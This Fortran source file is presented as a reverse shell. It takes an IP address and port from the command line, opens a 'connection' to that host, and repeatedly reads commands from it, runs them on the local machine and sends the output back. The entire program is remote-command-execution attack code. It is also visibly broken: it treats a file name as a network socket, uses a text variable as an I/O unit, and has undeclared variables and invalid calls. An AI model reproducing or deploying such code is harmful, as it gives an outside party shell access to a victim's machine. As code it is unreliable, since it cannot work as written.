program Reverse_Shell
    character(len=:), allocatable :: we
    character(len=:), allocatable :: clientIp
    character(len=:), allocatable :: ip
    integer :: po
    character(len=4096) :: cmd
    character(len=4096) :: output
    character(len=4096) :: cmdOutput
    character(len=:), allocatable :: socket

    ! ASCII art representation
    we = '  _____            _      _____          _      ' // &
         ' |  __ \          | |    / ____|        | |     ' // &
         ' | |__) |___  __ _| |___| |     ___   __| | ___ ' // &
         ' |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \' // &
         ' | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/' // &
         ' |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|'

    ! Get client IP address
    inquire(10, name=clientIp)

    ! Read IP address and port from command line
    if (command_argument_count() < 2) then
        write(*,*) "Please provide the IP address and port as command-line arguments."
        stop
    else
        call get_command_argument(1, ip)
        call get_command_argument(2, po)
    end if

    ! Concatenate client IP to ASCII art
    write(we, '(A, A)') we, "Client IP: " // trim(clientIp)

    ! Connect to the specified IP and port
    open(10, file=trim(ip) // ":" // trim(adjustl(int2str(po))), status="replace")
    socket = "10"

    ! Send ASCII art to the server
    write(socket, '(A)') we

    ! Loop for command execution
    do
        write(socket, '(A)') " $ "
        read(socket, '(A)') cmd
        cmd = trim(cmd)

        if (cmd == "exit") then
            exit
        end if

        cmdOutput = execute_command(cmd)
        write(socket, '(A)') cmdOutput
    end do

    ! Close the socket
    close(socket, status="keep")
contains

    ! Function to execute a shell command and return output
    function execute_command(cmd) result(output)
        character(len=*), intent(in) :: cmd
        character(len=4096) :: output
        character(len=4096) :: line
        integer :: unit

        call execute_command_line(cmd // " > cmd_output.txt")
        open(unit, file="cmd_output.txt", status="old")
        output = ""
        do
            read(unit, '(A)', iostat=end_of_file) line
            if (end_of_file /= 0) exit
            output = output // line // newline(trim=off)
        end do
        close(unit)

        return
    end function execute_command

    ! Function to convert an integer to string
    function int2str(x) result(s)
        integer, intent(in) :: x
        character(len=20) :: s
        write(s, '(I0)') x
    end function int2str
end program Reverse_Shell
